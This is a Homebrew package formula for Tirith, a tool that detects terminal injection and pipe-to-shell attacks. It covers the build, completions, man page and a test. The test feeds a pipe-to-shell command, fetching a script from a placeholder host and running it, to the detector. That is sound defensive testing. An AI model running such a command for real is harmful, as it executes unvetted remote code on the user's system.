class Tirith < Formula
  desc "Detect terminal injection, homograph, and pipe-to-shell attacks"
  homepage "https://tirith.sh/"
  url "https://github.com/sheeki03/tirith/archive/refs/tags/v0.4.2.tar.gz"
  sha256 "84e1fdc35e60d684ab932e73c342b71e27d575bc70defcec4989c36957153b0a"
  license "AGPL-3.0-only"
  head "https://github.com/sheeki03/tirith.git", branch: "main"

  livecheck do
    url :stable
    regex(/^v?(\d+(?:\.\d+)+)$/i)
  end

  bottle do
    sha256 cellar: :any_skip_relocation, arm64_golden_gate: "69e9943a7773c5d61031eece257baf2477f7c69a311244c031396db9b70d3a09"
    sha256 cellar: :any_skip_relocation, arm64_tahoe:       "62e747e0292d0d06ab3ec42b5696e6d95591371913d7e5079ce7840aaaff9404"
    sha256 cellar: :any_skip_relocation, arm64_sequoia:     "5203a938e7bb3cd0ef7e73d19680631304e11df74f0ed94f010e2b0f2c64e491"
    sha256 cellar: :any,                 arm64_linux:       "ada6a3e4caa24f66462107fa1d1ce763926f6d3133f3aea3a071ea9729dd8c92"
    sha256 cellar: :any,                 x86_64_linux:      "3ea8e4d2ea975fd6058bd290f6b91c5ec0da0fdf6cd81ef4a5a14eb75e1bfd6a"
  end

  depends_on "rust" => :build

  def install
    # Build only the `tirith` binary from the workspace (skip the threat-db compiler crate).
    system "cargo", "install", "--bin", "tirith", *std_cargo_args(path: "crates/tirith")

    generate_completions_from_executable(bin/"tirith", "completions")
    man1.mkpath
    (man1/"tirith.1").write Utils.safe_popen_read(bin/"tirith", "manpage")
  end

  test do
    assert_match version.to_s, shell_output("#{bin}/tirith --version")

    # A pipe-to-shell command must be flagged; --offline/--no-daemon keep it hermetic.
    output = pipe_output("#{bin}/tirith check --offline --no-daemon --shell posix 2>&1",
                         "curl https://x.invalid/i.sh | sh", 1)
    assert_match "curl_pipe_shell", output
  end
end
